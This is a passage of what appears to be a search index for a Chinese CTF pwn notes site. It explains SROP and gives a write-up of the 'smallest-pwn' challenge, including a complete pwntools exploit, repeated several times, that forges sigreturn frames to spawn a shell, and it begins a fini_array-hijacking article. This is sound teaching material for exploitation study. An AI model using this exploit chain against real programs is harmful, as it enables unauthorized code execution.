\u8bdd\u53ef\u4ee5\u7528\u7cfb\u7edf\u8c03\u7528\u53f7\u4ee3\u66ff\u3002\u5728 64 \u4f4d\u7cfb\u7edf\u4e2d\uff0csigreturn \u7cfb\u7edf\u8c03\u7528\u5bf9\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u53f7\u4e3a 15\uff0c\u53ea\u9700\u8981 RAX=15\uff0c\u5e76\u4e14\u6267\u884c syscall \u5373\u53ef\u5b9e\u73b0\u8c03\u7528 syscall \u8c03\u7528\u3002\u800c RAX \u5bc4\u5b58\u5668\u7684\u503c\u53c8\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236\u67d0\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u6765\u95f4\u63a5\u63a7\u5236\uff0c\u6bd4\u5982\u8bf4 read \u51fd\u6570\u7684\u8fd4\u56de\u503c\u4e3a\u8bfb\u53d6\u7684\u5b57\u8282\u6570\u3002","title":"\u4e24\u4e2a gadget \u5728\u54ea"},{"location":"Pwn/stackoverflow/SROP/srop/#_3","text":"pwntools \u4e2d\u5df2\u7ecf\u96c6\u6210\u4e86\u5bf9\u4e8e srop \u7684\u653b\u51fb\uff0c\u7528 SigreturnFrame \u751f\u6210 Signal Frame \u3002","title":"\u5229\u7528\u5de5\u5177"},{"location":"Pwn/stackoverflow/SROP/srop/#_4","text":"","title":"\u4f8b\u9898"},{"location":"Pwn/stackoverflow/SROP/srop/#360-smallest-pwn","text":"system call chains \u5229\u7528\uff0c\u591a\u6b21\u8c03\u7528 sigreturn","title":"360 \u6625\u79cb\u676f smallest-pwn"},{"location":"Pwn/stackoverflow/SROP/srop/#vn2020-babybabypwn","text":"system call chains \u7b80\u5355\u5229\u7528\uff0c\u63a7\u5236\u6062\u590d\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u540e\u8df3\u8f6c\u6267\u884c\u5199\u5165\u7684\u5229\u7528\u94fe","title":"[V&amp;N2020 \u516c\u5f00\u8d5b]babybabypwn"},{"location":"Pwn/stackoverflow/SROP/srop/#_5","text":"Sigreturn Oriented Programming (SROP) Attack\u653b\u51fb\u539f\u7406 ctfwiki advanced rop","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"Pwn/stackoverflow/SROP/360%20%E6%98%A5%E7%A7%8B%E6%9D%AF%20smallest-pwn/writeup/","text":"360 \u6625\u79cb\u676f smallest-pwn \u00b6 \u57fa\u672c\u60c5\u51b5 \u00b6 \u53ea\u6709\u51e0\u884c\u6c47\u7f16\uff0c\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u53f7 0 \u8c03\u7528 read \u5411 buf \u5199\u5165 0x400 \u5b57\u8282\uff0c\u9020\u6210\u6808\u6ea2\u51fa\u3002 \u76f4\u89c2\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a gadget \uff1a syscall;ret; \uff0c\u8fd9\u662f srop \u975e\u5e38\u5178\u578b\u7684 gadget \u3002 \u601d\u8def \u00b6 \u7531\u4e8e\u7a0b\u5e8f\u4e2d\u5e76\u6ca1\u6709 sigreturn \u8c03\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u81ea\u5df1\u6784\u9020\uff0c\u6b63\u597d\u8fd9\u91cc\u6709 read \u51fd\u6570\u8c03\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 read \u51fd\u6570\u8bfb\u53d6\u7684\u5b57\u8282\u6570\u6765\u8bbe\u7f6e rax \u7684\u503c\u3002\u91cd\u8981\u601d\u8def\u5982\u4e0b \u901a\u8fc7\u63a7\u5236 read \u8bfb\u53d6\u7684\u5b57\u7b26\u6570\u6765\u8bbe\u7f6e RAX \u5bc4\u5b58\u5668\u7684\u503c\uff0c\u4ece\u800c\u6267\u884c sigreturn \u901a\u8fc7 syscall \u6267\u884c execve(\"/bin/sh\",0,0) \u6765\u83b7\u53d6 shell\u3002 \u57fa\u672c\u6d41\u7a0b\u4e3a \u8bfb\u53d6\u4e09\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740 \u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u5229\u7528\u7b2c\u4e00\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740\u8bfb\u53d6\u5730\u5740\uff0c\u4fee\u6539\u8fd4\u56de\u5730\u5740 (\u5373\u7b2c\u4e8c\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740) \u4e3a\u6e90\u7a0b\u5e8f\u7684\u7b2c\u4e8c\u6761\u6307\u4ee4\uff0c\u5e76\u4e14\u4f1a\u8bbe\u7f6e rax=1 \u90a3\u4e48\u6b64\u65f6\u5c06\u4f1a\u6267\u884c write(1,$esp,0x400)\uff0c\u6cc4\u9732\u6808\u5730\u5740\u3002 \u5229\u7528\u7b2c\u4e09\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740\u8fdb\u800c\u8bfb\u5165 payload \u518d\u6b21\u8bfb\u53d6\u6784\u9020 sigreturn \u8c03\u7528\uff0c\u8fdb\u800c\u5c06\u5411\u6808\u5730\u5740\u6240\u5728\u4f4d\u7f6e\u8bfb\u5165\u6570\u636e\uff0c\u6784\u9020 execve('/bin/sh',0,0) \u518d\u6b21\u8bfb\u53d6\u6784\u9020 sigreturn \u8c03\u7528\uff0c\u4ece\u800c\u83b7\u53d6 shell\u3002 step 0 \u00b6 \u6ea2\u51fa\u5199\u5165 3 \u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740\uff08start_addr\uff09\uff0c\u7528\u4e8e step012 \u7ed3\u675f\u540e\u8fd4\u56de\u7a0b\u5e8f\u5f00\u59cb\u4f4d\u7f6e\u3002 # ==step0== payload = p64 ( start_addr ) * 3 #step012 p . send ( payload ) step 1 \u00b6 \u9996\u5148\u662f\u8981\u5199\u5165 1 \u5b57\u8282\uff0c\u8ba9 rax \u53d8\u6210 1 \uff08write \u7cfb\u7edf\u8c03\u7528\u53f7\uff09\u3002\u7136\u540e\u662f\u9700\u8981\u4fee\u6539\u8df3\u8f6c\u5730\u5740\u5230 0x4000B3 \u7ed5\u5f00 xor \uff0c\u4fdd\u6301 rax \u7684\u503c\uff0c\u521a\u597d\u5199\u5165\u6307\u9488\u6307\u5411\u7684\u662f step 1 \u7684\u8fd4\u56de\u5730\u5740\uff0cstep 0 \u63d0\u524d\u5e03\u7f6e\u5199\u5165\u4e86 start_addr \uff0c\u8fd9\u91cc\u521a\u597d\u8986\u76d6\u6700\u540e\u4e00\u5b57\u8282\u3002 # ==step1== ## modify the return addr to start_addr+3 ## so that skip the xor rax,rax; then the rax=1 p . send ( ' \\xb3 ' ) # \u7b2c\u4e8c\u4e2astart_addr # \u5199\u5165\u4e00\u4e2a\u5b57\u8282\uff0c\u8ba9rax\u53d8\u62101\uff0c\u4e5f\u5c31\u662f\u7cfb\u7edf\u8c03\u7528\u53f71 write # \u540c\u65f6\u8fd9\u4e2a\u662f\u8986\u76d6\u5199\u5165\u7b2c\u4e8c\u4e2astart_addr\u6700\u4f4e\u5b57\u8282\uff0c\u76f4\u63a5\u63a7\u5236\u8df3\u8f6c0x4000B3\u4fdd\u5b58rax\u7684\u503c step 2 \u00b6 \u63a5\u6536\u5730\u5740\uff0c\u6b63\u5e38\u8df3\u8f6c\u56de start_addr # ==step2== stack_addr = u64 ( p . recv ()[ 8 : 16 ]) # \u63a5\u53d7rsp\u4e0b\u4e00\u4e2a\u5185\u5b58\u5757\u4e2d\u7684\u6808\u5730\u5740 # \u7b2c\u4e09\u4e2astart_addr log . success ( 'leak stack addr :' + hex ( stack_addr )) step 3 \u00b6 \u5199\u5165\u4f2a\u9020\u7684 SigreturnFrame \u3002\u5199\u5165\u7684\u6307\u9488\u53c8\u662f\u5f53\u524d\u6808\u7684\u8fd4\u56de\u5730\u5740\uff0c\u6240\u4ee5 payload \u5148\u586b\u5165\u8fd4\u56de\u5730\u5740 start_addr \u3002\u7136\u540e\u7528 8 \u5b57\u8282\u586b\u5145\u4e4b\u540e\u518d\u5199\u5165 SigreturnFrame \uff0cROP \u4e4b\u540e rsp \u4f1a\u5411\u9ad8\u5730\u5740\u62ac 8 \u4e2a\u5b57\u8282\uff08\u6307\u5411\u8fd9 8 \u4e2a\u5b57\u8282\u6240\u5728\u7684\u5730\u5740\uff09\uff0c\u7a7a\u51fa\u6765\u653e step 4 \u7684 syscall_ret \u3002sigframe \u4e0d\u53bb\u9664\u524d 8 \u5b57\u8282\u7684 rt_signalret \u662f\u7559\u7a7a\u95f4\u7ed9 step 4 \u7528\u4f5c\u586b\u5145\u7a7a\u95f4\u3002 # ==step3== ## make the rsp point to stack_addr ## the frame is read(0,stack_addr,0x400) sigframe = SigreturnFrame () sigframe . rax = constants . SYS_read sigframe . rdi = 0 sigframe . rsi = stack_addr sigframe . rdx = 0x400 sigframe . rsp = stack_addr sigframe . rip = syscall_ret payload = p64 ( start_addr ) + 'a' * 8 + str ( sigframe ) # start_addr\u6539\u5199\u81ea\u5df1\u8fd4\u56de\u5730\u5740 p . send ( payload ) step 4 \u00b6 syscall_ret \u586b\u5145 'a'*8 \uff0c\\x00 \u586b\u5145 rt_sigreturn \u3002\u7528 syscall_ret \u4e3b\u52a8\u6062\u590d\u5185\u5b58\u72b6\u6001\uff0c\u5c31\u4e0d\u9700\u8981\u7528\u5230 re_sigreturn \u88ab\u52a8\u8c03\u7528\u6062\u590d\u5185\u5b58\u72b6\u6001\u3002\uff08\u8fd9\u70b9\u662f\u6211\u6839\u636e\u5176\u4ed6\u7c7b\u4f3c\u9898\u76ee wp \u4e2d str(sigframe[8:]) \uff0csignal \u6808\u5e27\u524d\u9762\u662f\u4e3b\u52a8\u7684 syscall(15) \u8c03\u7528 rt_signreturn \uff0c\u5c31\u4e0d\u9700\u8981 signal \u6808\u5e27\u4e2d\u7684 rt_signreturn \u88ab\u52a8\u8c03\u7528\uff09 # ==step4== ## set rax=15 and call sigreturn\u3001 sigreturn = p64 ( syscall_ret ) + ' \\x00 ' * 7 # \u8986\u76d6rt_sigreturn;\u586b\u514515\u5b57\u8282 # \u4fee\u6539\u8fd4\u56de\u5730\u5740\u5230syscall ret p . send ( sigreturn ) step 5 \u00b6 \u548c step 3 \u4e00\u6837\u5199\u5165 signal \u6808\u5e27\uff0c\u8fd9\u91cc\u5199\u5165\u7684\u662f execve \u7684\u3002 # ==step5== ## call execv(\"/bin/sh\",0,0) sigframe = SigreturnFrame () sigframe . rax = constants . SYS_execve sigframe . rdi = stack_addr + 0x120 # \"/bin/sh\" 's addr sigframe . rsi = 0x0 sigframe . rdx = 0x0 sigframe . rsp = stack_addr sigframe . rip = syscall_ret frame_payload = p64 ( start_addr ) + ' \\x00 ' * 8 + str ( sigframe ) #start_addr \u6539\u5199\u81ea\u5df1\u8fd4\u56de\u5730\u5740 print len ( frame_payload ) payload = frame_payload + ( 0x120 - len ( frame_payload )) * ' \\x00 ' + '/bin/sh \\x00 ' p . send ( payload ) step 6 \u00b6 \u4e0e step 4 \u4e00\u6837\u4e3b\u52a8\u8c03\u7528 rt_sigreturn \u6062\u590d\u5185\u5b58\u72b6\u6001\u3002 # ==step6== p . send ( sigreturn ) # \u8c03\u7528syscall p . interactive () EXP \u00b6 #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * context ( log_level = 'debug' , arch = 'amd64' ) p = process ( './smallest' ) small = ELF ( './smallest' ) syscall_ret = 0x00000000004000BE start_addr = 0x00000000004000B0 # ==step0== payload = p64 ( start_addr ) * 3 #step012 p . send ( payload ) #\u7b2c\u4e00\u4e2astart_addr # ==step1== ## modify the return addr to start_addr+3 ## so that skip the xor rax,rax; then the rax=1 p . send ( ' \\xb3 ' ) # \u7b2c\u4e8c\u4e2astart_addr # \u5199\u5165\u4e00\u4e2a\u5b57\u8282\uff0c\u8ba9rax\u53d8\u62101\uff0c\u4e5f\u5c31\u662f\u7cfb\u7edf\u8c03\u7528\u53f71 write # \u540c\u65f6\u8fd9\u4e2a\u662f\u8986\u76d6\u5199\u5165\u7b2c\u4e8c\u4e2astart_addr\u6700\u4f4e\u5b57\u8282\uff0c\u76f4\u63a5\u63a7\u5236\u8df3\u8f6c0x4000B3\u4fdd\u5b58rax\u7684\u503c # ==step2== stack_addr = u64 ( p . recv ()[ 8 : 16 ]) # \u63a5\u53d7rsp\u4e0b\u4e00\u4e2a\u5185\u5b58\u5757\u4e2d\u7684\u6808\u5730\u5740 # \u7b2c\u4e09\u4e2astart_addr log . success ( 'leak stack addr :' + hex ( stack_addr )) # ==step3== ## make the rsp point to stack_addr ## the frame is read(0,stack_addr,0x400) sigframe = SigreturnFrame () sigframe . rax = constants . SYS_read sigframe . rdi = 0 sigframe . rsi = stack_addr sigframe . rdx = 0x400 sigframe . rsp = stack_addr sigframe . rip = syscall_ret payload = p64 ( start_addr ) + 'a' * 8 + str ( sigframe ) #start_addr \u6539\u5199\u81ea\u5df1\u8fd4\u56de\u5730\u5740 p . send ( payload ) # ==step4== ## set rax=15 and call sigreturn\u3001 sigreturn = p64 ( syscall_ret ) + ' \\x00 ' * 7 # \u8986\u76d6rt_sigreturn;\u586b\u514515\u5b57\u8282 # \u4fee\u6539\u8fd4\u56de\u5730\u5740\u5230syscall ret p . send ( sigreturn ) # ==step5== ## call execv(\"/bin/sh\",0,0) sigframe = SigreturnFrame () sigframe . rax = constants . SYS_execve sigframe . rdi = stack_addr + 0x120 # \"/bin/sh\" 's addr sigframe . rsi = 0x0 sigframe . rdx = 0x0 sigframe . rsp = stack_addr sigframe . rip = syscall_ret frame_payload = p64 ( start_addr ) + ' \\x00 ' * 8 + str ( sigframe ) #start_addr \u6539\u5199\u81ea\u5df1\u8fd4\u56de\u5730\u5740 print len ( frame_payload ) payload = frame_payload + ( 0x120 - len ( frame_payload )) * ' \\x00 ' + '/bin/sh \\x00 ' p . send ( payload ) ## ==step6== p . send ( sigreturn ) # \u8c03\u7528syscall p . interactive () \u53c2\u8003\u6587\u7ae0 \u00b6 2017 429 ichunqiu ctf smallest(pwn300) writeup ctf-wiki","title":"Writeup"},{"location":"Pwn/stackoverflow/SROP/360%20%E6%98%A5%E7%A7%8B%E6%9D%AF%20smallest-pwn/writeup/#360-smallest-pwn","text":"","title":"360 \u6625\u79cb\u676f smallest-pwn"},{"location":"Pwn/stackoverflow/SROP/360%20%E6%98%A5%E7%A7%8B%E6%9D%AF%20smallest-pwn/writeup/#_1","text":"\u53ea\u6709\u51e0\u884c\u6c47\u7f16\uff0c\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u53f7 0 \u8c03\u7528 read \u5411 buf \u5199\u5165 0x400 \u5b57\u8282\uff0c\u9020\u6210\u6808\u6ea2\u51fa\u3002 \u76f4\u89c2\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a gadget \uff1a syscall;ret; \uff0c\u8fd9\u662f srop \u975e\u5e38\u5178\u578b\u7684 gadget \u3002","title":"\u57fa\u672c\u60c5\u51b5"},{"location":"Pwn/stackoverflow/SROP/360%20%E6%98%A5%E7%A7%8B%E6%9D%AF%20smallest-pwn/writeup/#_2","text":"\u7531\u4e8e\u7a0b\u5e8f\u4e2d\u5e76\u6ca1\u6709 sigreturn \u8c03\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u81ea\u5df1\u6784\u9020\uff0c\u6b63\u597d\u8fd9\u91cc\u6709 read \u51fd\u6570\u8c03\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 read \u51fd\u6570\u8bfb\u53d6\u7684\u5b57\u8282\u6570\u6765\u8bbe\u7f6e rax \u7684\u503c\u3002\u91cd\u8981\u601d\u8def\u5982\u4e0b \u901a\u8fc7\u63a7\u5236 read \u8bfb\u53d6\u7684\u5b57\u7b26\u6570\u6765\u8bbe\u7f6e RAX \u5bc4\u5b58\u5668\u7684\u503c\uff0c\u4ece\u800c\u6267\u884c sigreturn \u901a\u8fc7 syscall \u6267\u884c execve(\"/bin/sh\",0,0) \u6765\u83b7\u53d6 shell\u3002 \u57fa\u672c\u6d41\u7a0b\u4e3a \u8bfb\u53d6\u4e09\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740 \u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u5229\u7528\u7b2c\u4e00\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740\u8bfb\u53d6\u5730\u5740\uff0c\u4fee\u6539\u8fd4\u56de\u5730\u5740 (\u5373\u7b2c\u4e8c\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740) \u4e3a\u6e90\u7a0b\u5e8f\u7684\u7b2c\u4e8c\u6761\u6307\u4ee4\uff0c\u5e76\u4e14\u4f1a\u8bbe\u7f6e rax=1 \u90a3\u4e48\u6b64\u65f6\u5c06\u4f1a\u6267\u884c write(1,$esp,0x400)\uff0c\u6cc4\u9732\u6808\u5730\u5740\u3002 \u5229\u7528\u7b2c\u4e09\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740\u8fdb\u800c\u8bfb\u5165 payload \u518d\u6b21\u8bfb\u53d6\u6784\u9020 sigreturn \u8c03\u7528\uff0c\u8fdb\u800c\u5c06\u5411\u6808\u5730\u5740\u6240\u5728\u4f4d\u7f6e\u8bfb\u5165\u6570\u636e\uff0c\u6784\u9020 execve('/bin/sh',0,0) \u518d\u6b21\u8bfb\u53d6\u6784\u9020 sigreturn \u8c03\u7528\uff0c\u4ece\u800c\u83b7\u53d6 shell\u3002","title":"\u601d\u8def"},{"location":"Pwn/stackoverflow/SROP/360%20%E6%98%A5%E7%A7%8B%E6%9D%AF%20smallest-pwn/writeup/#step-0","text":"\u6ea2\u51fa\u5199\u5165 3 \u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740\uff08start_addr\uff09\uff0c\u7528\u4e8e step012 \u7ed3\u675f\u540e\u8fd4\u56de\u7a0b\u5e8f\u5f00\u59cb\u4f4d\u7f6e\u3002 # ==step0== payload = p64 ( start_addr ) * 3 #step012 p . send ( payload )","title":"step 0"},{"location":"Pwn/stackoverflow/SROP/360%20%E6%98%A5%E7%A7%8B%E6%9D%AF%20smallest-pwn/writeup/#step-1","text":"\u9996\u5148\u662f\u8981\u5199\u5165 1 \u5b57\u8282\uff0c\u8ba9 rax \u53d8\u6210 1 \uff08write \u7cfb\u7edf\u8c03\u7528\u53f7\uff09\u3002\u7136\u540e\u662f\u9700\u8981\u4fee\u6539\u8df3\u8f6c\u5730\u5740\u5230 0x4000B3 \u7ed5\u5f00 xor \uff0c\u4fdd\u6301 rax \u7684\u503c\uff0c\u521a\u597d\u5199\u5165\u6307\u9488\u6307\u5411\u7684\u662f step 1 \u7684\u8fd4\u56de\u5730\u5740\uff0cstep 0 \u63d0\u524d\u5e03\u7f6e\u5199\u5165\u4e86 start_addr \uff0c\u8fd9\u91cc\u521a\u597d\u8986\u76d6\u6700\u540e\u4e00\u5b57\u8282\u3002 # ==step1== ## modify the return addr to start_addr+3 ## so that skip the xor rax,rax; then the rax=1 p . send ( ' \\xb3 ' ) # \u7b2c\u4e8c\u4e2astart_addr # \u5199\u5165\u4e00\u4e2a\u5b57\u8282\uff0c\u8ba9rax\u53d8\u62101\uff0c\u4e5f\u5c31\u662f\u7cfb\u7edf\u8c03\u7528\u53f71 write # \u540c\u65f6\u8fd9\u4e2a\u662f\u8986\u76d6\u5199\u5165\u7b2c\u4e8c\u4e2astart_addr\u6700\u4f4e\u5b57\u8282\uff0c\u76f4\u63a5\u63a7\u5236\u8df3\u8f6c0x4000B3\u4fdd\u5b58rax\u7684\u503c","title":"step 1"},{"location":"Pwn/stackoverflow/SROP/360%20%E6%98%A5%E7%A7%8B%E6%9D%AF%20smallest-pwn/writeup/#step-2","text":"\u63a5\u6536\u5730\u5740\uff0c\u6b63\u5e38\u8df3\u8f6c\u56de start_addr # ==step2== stack_addr = u64 ( p . recv ()[ 8 : 16 ]) # \u63a5\u53d7rsp\u4e0b\u4e00\u4e2a\u5185\u5b58\u5757\u4e2d\u7684\u6808\u5730\u5740 # \u7b2c\u4e09\u4e2astart_addr log . success ( 'leak stack addr :' + hex ( stack_addr ))","title":"step 2"},{"location":"Pwn/stackoverflow/SROP/360%20%E6%98%A5%E7%A7%8B%E6%9D%AF%20smallest-pwn/writeup/#step-3","text":"\u5199\u5165\u4f2a\u9020\u7684 SigreturnFrame \u3002\u5199\u5165\u7684\u6307\u9488\u53c8\u662f\u5f53\u524d\u6808\u7684\u8fd4\u56de\u5730\u5740\uff0c\u6240\u4ee5 payload \u5148\u586b\u5165\u8fd4\u56de\u5730\u5740 start_addr \u3002\u7136\u540e\u7528 8 \u5b57\u8282\u586b\u5145\u4e4b\u540e\u518d\u5199\u5165 SigreturnFrame \uff0cROP \u4e4b\u540e rsp \u4f1a\u5411\u9ad8\u5730\u5740\u62ac 8 \u4e2a\u5b57\u8282\uff08\u6307\u5411\u8fd9 8 \u4e2a\u5b57\u8282\u6240\u5728\u7684\u5730\u5740\uff09\uff0c\u7a7a\u51fa\u6765\u653e step 4 \u7684 syscall_ret \u3002sigframe \u4e0d\u53bb\u9664\u524d 8 \u5b57\u8282\u7684 rt_signalret \u662f\u7559\u7a7a\u95f4\u7ed9 step 4 \u7528\u4f5c\u586b\u5145\u7a7a\u95f4\u3002 # ==step3== ## make the rsp point to stack_addr ## the frame is read(0,stack_addr,0x400) sigframe = SigreturnFrame () sigframe . rax = constants . SYS_read sigframe . rdi = 0 sigframe . rsi = stack_addr sigframe . rdx = 0x400 sigframe . rsp = stack_addr sigframe . rip = syscall_ret payload = p64 ( start_addr ) + 'a' * 8 + str ( sigframe ) # start_addr\u6539\u5199\u81ea\u5df1\u8fd4\u56de\u5730\u5740 p . send ( payload )","title":"step 3"},{"location":"Pwn/stackoverflow/SROP/360%20%E6%98%A5%E7%A7%8B%E6%9D%AF%20smallest-pwn/writeup/#step-4","text":"syscall_ret \u586b\u5145 'a'*8 \uff0c\\x00 \u586b\u5145 rt_sigreturn \u3002\u7528 syscall_ret \u4e3b\u52a8\u6062\u590d\u5185\u5b58\u72b6\u6001\uff0c\u5c31\u4e0d\u9700\u8981\u7528\u5230 re_sigreturn \u88ab\u52a8\u8c03\u7528\u6062\u590d\u5185\u5b58\u72b6\u6001\u3002\uff08\u8fd9\u70b9\u662f\u6211\u6839\u636e\u5176\u4ed6\u7c7b\u4f3c\u9898\u76ee wp \u4e2d str(sigframe[8:]) \uff0csignal \u6808\u5e27\u524d\u9762\u662f\u4e3b\u52a8\u7684 syscall(15) \u8c03\u7528 rt_signreturn \uff0c\u5c31\u4e0d\u9700\u8981 signal \u6808\u5e27\u4e2d\u7684 rt_signreturn \u88ab\u52a8\u8c03\u7528\uff09 # ==step4== ## set rax=15 and call sigreturn\u3001 sigreturn = p64 ( syscall_ret ) + ' \\x00 ' * 7 # \u8986\u76d6rt_sigreturn;\u586b\u514515\u5b57\u8282 # \u4fee\u6539\u8fd4\u56de\u5730\u5740\u5230syscall ret p . send ( sigreturn )","title":"step 4"},{"location":"Pwn/stackoverflow/SROP/360%20%E6%98%A5%E7%A7%8B%E6%9D%AF%20smallest-pwn/writeup/#step-5","text":"\u548c step 3 \u4e00\u6837\u5199\u5165 signal \u6808\u5e27\uff0c\u8fd9\u91cc\u5199\u5165\u7684\u662f execve \u7684\u3002 # ==step5== ## call execv(\"/bin/sh\",0,0) sigframe = SigreturnFrame () sigframe . rax = constants . SYS_execve sigframe . rdi = stack_addr + 0x120 # \"/bin/sh\" 's addr sigframe . rsi = 0x0 sigframe . rdx = 0x0 sigframe . rsp = stack_addr sigframe . rip = syscall_ret frame_payload = p64 ( start_addr ) + ' \\x00 ' * 8 + str ( sigframe ) #start_addr \u6539\u5199\u81ea\u5df1\u8fd4\u56de\u5730\u5740 print len ( frame_payload ) payload = frame_payload + ( 0x120 - len ( frame_payload )) * ' \\x00 ' + '/bin/sh \\x00 ' p . send ( payload )","title":"step 5"},{"location":"Pwn/stackoverflow/SROP/360%20%E6%98%A5%E7%A7%8B%E6%9D%AF%20smallest-pwn/writeup/#step-6","text":"\u4e0e step 4 \u4e00\u6837\u4e3b\u52a8\u8c03\u7528 rt_sigreturn \u6062\u590d\u5185\u5b58\u72b6\u6001\u3002 # ==step6== p . send ( sigreturn ) # \u8c03\u7528syscall p . interactive ()","title":"step 6"},{"location":"Pwn/stackoverflow/SROP/360%20%E6%98%A5%E7%A7%8B%E6%9D%AF%20smallest-pwn/writeup/#exp","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * context ( log_level = 'debug' , arch = 'amd64' ) p = process ( './smallest' ) small = ELF ( './smallest' ) syscall_ret = 0x00000000004000BE start_addr = 0x00000000004000B0 # ==step0== payload = p64 ( start_addr ) * 3 #step012 p . send ( payload ) #\u7b2c\u4e00\u4e2astart_addr # ==step1== ## modify the return addr to start_addr+3 ## so that skip the xor rax,rax; then the rax=1 p . send ( ' \\xb3 ' ) # \u7b2c\u4e8c\u4e2astart_addr # \u5199\u5165\u4e00\u4e2a\u5b57\u8282\uff0c\u8ba9rax\u53d8\u62101\uff0c\u4e5f\u5c31\u662f\u7cfb\u7edf\u8c03\u7528\u53f71 write # \u540c\u65f6\u8fd9\u4e2a\u662f\u8986\u76d6\u5199\u5165\u7b2c\u4e8c\u4e2astart_addr\u6700\u4f4e\u5b57\u8282\uff0c\u76f4\u63a5\u63a7\u5236\u8df3\u8f6c0x4000B3\u4fdd\u5b58rax\u7684\u503c # ==step2== stack_addr = u64 ( p . recv ()[ 8 : 16 ]) # \u63a5\u53d7rsp\u4e0b\u4e00\u4e2a\u5185\u5b58\u5757\u4e2d\u7684\u6808\u5730\u5740 # \u7b2c\u4e09\u4e2astart_addr log . success ( 'leak stack addr :' + hex ( stack_addr )) # ==step3== ## make the rsp point to stack_addr ## the frame is read(0,stack_addr,0x400) sigframe = SigreturnFrame () sigframe . rax = constants . SYS_read sigframe . rdi = 0 sigframe . rsi = stack_addr sigframe . rdx = 0x400 sigframe . rsp = stack_addr sigframe . rip = syscall_ret payload = p64 ( start_addr ) + 'a' * 8 + str ( sigframe ) #start_addr \u6539\u5199\u81ea\u5df1\u8fd4\u56de\u5730\u5740 p . send ( payload ) # ==step4== ## set rax=15 and call sigreturn\u3001 sigreturn = p64 ( syscall_ret ) + ' \\x00 ' * 7 # \u8986\u76d6rt_sigreturn;\u586b\u514515\u5b57\u8282 # \u4fee\u6539\u8fd4\u56de\u5730\u5740\u5230syscall ret p . send ( sigreturn ) # ==step5== ## call execv(\"/bin/sh\",0,0) sigframe = SigreturnFrame () sigframe . rax = constants . SYS_execve sigframe . rdi = stack_addr + 0x120 # \"/bin/sh\" 's addr sigframe . rsi = 0x0 sigframe . rdx = 0x0 sigframe . rsp = stack_addr sigframe . rip = syscall_ret frame_payload = p64 ( start_addr ) + ' \\x00 ' * 8 + str ( sigframe ) #start_addr \u6539\u5199\u81ea\u5df1\u8fd4\u56de\u5730\u5740 print len ( frame_payload ) payload = frame_payload + ( 0x120 - len ( frame_payload )) * ' \\x00 ' + '/bin/sh \\x00 ' p . send ( payload ) ## ==step6== p . send ( sigreturn ) # \u8c03\u7528syscall p . interactive ()","title":"EXP"},{"location":"Pwn/stackoverflow/SROP/360%20%E6%98%A5%E7%A7%8B%E6%9D%AF%20smallest-pwn/writeup/#_3","text":"2017 429 ichunqiu ctf smallest(pwn300) writeup ctf-wiki","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/","text":"\u52ab\u6301 64 \u4f4d fini_array \u8fdb\u884c ROP \u653b\u51fb \u00b6 \u7a0b\u5e8f\u8d77\u70b9 \u00b6 \u7a0b\u5e8f\u7684\u542f\u52a8\u6d41\u7a0b\u5982\u56fe\u6240\u793a\uff1a \u53ef\u4ee5\u770b\u5230 main \u51fd\u6570\u4e0d\u662f\u7a0b\u5e8f\u8d77\u70b9\uff0c\u4e4b\u524d\u5199\u7684 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 \u4e5f\u5206\u6790\u8fc7 text \u6bb5\u8d77\u70b9\u662f _start \u51fd\u6570 \u3002_start \u51fd\u6570\u8c03\u7528__libc_start_main \u5b8c\u6210\u542f\u52a8\u548c\u9000\u51fa\u5de5\u4f5c\u3002\u5177\u4f53\u770b\u770b _start \u51fd\u6570\uff1a . text : 0000000000401 A60 public start . text : 0000000000401 A60 start proc near ; DATA XREF : LOAD : 000000000040001 8 \u2191 o . text : 0000000000401 A60 ; __unwind { . text : 0000000000401 A60 xor ebp , ebp . text : 0000000000401 A62 mov r9 , rdx . text : 0000000000401 A65 pop rsi . text : 0000000000401 A66 mov rdx , rsp . text : 0000000000401 A69 and rsp , 0F FFFFFFFFFFFFFF0h . text : 0000000000401 A6D push rax . text : 0000000000401 A6E push rsp // \u4ee5\u6b64\u5c06 fini\u3001init\u3001main \u5730\u5740\u538b\u5165\u5bc4\u5b58\u5668 . text : 0000000000401 A6F mov r8 , offset sub_402BD0 ; fini . text : 0000000000401 A76 mov rcx , offset loc_402B40 ; init . text : 0000000000401 A7D mov rdi , offset main . text : 0000000000401 A84 db 67 h . text : 0000000000401 A84 call __libc_start_main . text : 0000000000401 A8A hlt . text : 0000000000401 A8A ; } // starts at 401A60 . text : 0000000000401 A8A start endp __libc_start_main \u5b9a\u4e49\u539f\u578b \uff1a int __libc_start_main ( int ( * main ) ( int , char ** , char ** ), int argc , char ** ubp_av , void ( * init ) ( void ), void ( * fini ) ( void ), void ( * rtld_fini ) ( void ), void ( * stack_end )); \u6839\u636e 64 